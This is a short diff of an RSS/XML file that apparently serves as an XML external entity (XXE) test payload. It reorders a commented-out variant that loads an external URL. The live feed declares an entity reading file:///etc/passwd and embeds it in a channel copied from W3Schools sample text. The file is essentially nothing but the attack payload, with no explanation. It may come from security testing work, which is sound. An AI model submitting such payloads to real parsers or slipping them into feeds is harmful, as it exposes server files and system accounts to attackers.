@@ -1,19 +1,3 @@
-<!--<?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://grepular.com/xxe.txt" >]>
-  <rss version="2.0">
-    <foo>&xxe;</foo>
-    <channel>
-      <title>W3Schools Home Page</title>
-      <link>http://www.w3schools.com</link>
-      <description>Free web building tutorials</description>
-      <item>
-        <title>XML Tutorial</title>
-        <link>http://www.w3schools.com/xml</link>
-        <description>New XML tutorial on W3Schools</description>
-      </item>
-    </channel>
-  </rss>-->
-  
  <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
@@ -32,3 +16,19 @@
     </item>
 </channel>
 </rss> 
+
+<!--<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://grepular.com/xxe.txt" >]>
+  <rss version="2.0">
+    <foo>&xxe;</foo>
+    <channel>
+      <title>W3Schools Home Page</title>
+      <link>http://www.w3schools.com</link>
+      <description>Free web building tutorials</description>
+      <item>
+        <title>XML Tutorial</title>
+        <link>http://www.w3schools.com/xml</link>
+        <description>New XML tutorial on W3Schools</description>
+      </item>
+    </channel>
+  </rss>-->
